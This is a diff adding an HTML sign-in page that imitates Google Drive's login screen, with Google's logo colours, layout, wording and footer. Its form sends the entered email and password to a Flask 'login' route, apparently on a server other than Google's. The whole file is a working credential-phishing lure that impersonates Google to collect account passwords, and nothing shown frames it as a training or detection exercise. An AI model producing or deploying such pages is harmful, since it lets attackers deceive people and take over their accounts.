@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Google Drive</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background-color: #f4f5f7;
+            color: #172b4d;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 16px;
+        }
+
+        .gdrive-body {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 40px;
+            box-shadow: 0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .gdrive-header {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 32px;
+        }
+
+        .gdrive-title {
+            font-size: 24px;
+            font-weight: 400;
+            color: #1f1f1f;
+            margin-top: 16px;
+        }
+
+        .gdrive-subtitle {
+            font-size: 16px;
+            color: #444746;
+            margin-top: 8px;
+        }
+
+        .gdrive-form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .gdrive-input-container {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .gdrive-input {
+            width: 100%;
+            height: 56px;
+            padding: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #1f1f1f;
+            outline: none;
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+
+        .gdrive-input:focus {
+            border-color: #0b57d0;
+            border-width: 2px;
+            padding: 15px;
+        }
+
+        .gdrive-link {
+            color: #0b57d0;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+
+        .gdrive-link:hover {
+            text-decoration: underline;
+        }
+
+        .gdrive-info-text {
+            font-size: 14px;
+            color: #444746;
+            line-height: 1.4;
+            margin-bottom: 36px;
+        }
+
+        .gdrive-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .gdrive-btn-primary {
+            background-color: #0b57d0;
+            color: #ffffff;
+            padding: 0 24px;
+            height: 40px;
+            border-radius: 20px;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+        }
+
+        .gdrive-btn-primary:hover {
+            background-color: #0842a0;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+
+        .gdrive-footer-bar {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 8px;
+            font-size: 12px;
+            color: #444746;
+            margin-top: 16px;
+        }
+
+        .gdrive-footer-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .gdrive-footer-links a {
+            color: #444746;
+            text-decoration: none;
+        }
+
+        .gdrive-footer-links a:hover {
+            color: #1f1f1f;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="gdrive-body">
+        <div class="gdrive-header">
+            <svg width="40" height="40" viewBox="0 0 24 24">
+                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
+                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
+            </svg>
+            <h1 class="gdrive-title">Sign in</h1>
+            <p class="gdrive-subtitle">to continue to Google Drive</p>
+        </div>
+
+        <form class="gdrive-form" action="{{ url_for('login') }}" method="POST">
+            <div class="gdrive-input-container">
+                <input type="text" id="gd-email" name="username" class="gdrive-input" placeholder="Email or phone" required>
+            </div>
+
+            <div class="gdrive-input-container">
+                <input type="password" id="gd-password" name="password" class="gdrive-input" placeholder="Password" required>
+            </div>
+
+            <a href="#" class="gdrive-link">Forgot email?</a>
+
+            <p class="gdrive-info-text">
+                Not your computer? Use Guest mode to sign in privately. <a href="#" class="gdrive-link" style="margin-bottom:0;">Learn more</a>
+            </p>
+
+            <div class="gdrive-actions">
+                <a href="#" class="gdrive-link" style="margin-bottom:0;">Create account</a>
+                <button type="submit" class="gdrive-btn-primary">Next</button>
+            </div>
+        </form>
+    </div>
+
+    <div class="gdrive-footer-bar">
+        <span>English (United States)</span>
+        <div class="gdrive-footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+</body>
+</html>
